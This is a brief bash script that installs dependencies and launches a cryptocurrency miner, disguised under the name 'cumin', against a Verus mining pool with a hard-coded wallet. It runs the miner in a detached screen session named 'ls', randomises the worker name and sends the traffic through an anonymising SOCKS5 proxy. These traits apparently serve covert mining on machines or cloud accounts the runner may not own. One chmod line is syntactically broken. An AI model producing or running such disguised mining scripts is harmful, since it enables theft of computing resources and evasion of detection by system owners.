#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cuan.sh && chmod +x cumin chmod 777 cumin cuan.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RGDUj7Y5uw8HDntYd9U4WiPWpiTJQrTyYM
WORKER=$(echo $(shuf -i 1-10 -n 1)KING)
PROXY=socks5://72.195.34.42:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
